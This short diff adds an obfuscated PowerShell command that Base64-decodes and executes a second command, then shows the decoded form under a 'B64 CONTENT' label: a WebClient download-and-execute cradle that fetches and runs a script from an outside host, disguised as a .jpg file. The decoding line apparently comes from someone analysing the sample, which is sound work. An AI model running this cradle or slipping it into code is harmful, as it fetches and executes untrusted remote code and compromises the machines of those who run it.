@@ -1,0 +1,7 @@
+iex([SystEM.Text.ENCOding]::uTF8.getsTRING([sysTem.CONveRt]::FRomBAse64sTriNg('CklFWCAoKG5ldy1vYmplY3QgTmVULndFQkNsaUVOdCkuRE9XbkxvYURzdFJpTmcoJ2h0dHA6Ly9wbWxhYnMubmV0L2Npcy90ZXN0LmpwZycpKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+IEX ((new-object NeT.wEBCliENt).DOWnLoaDstRiNg('http://pmlabs.net/cis/test.jpg'))
+
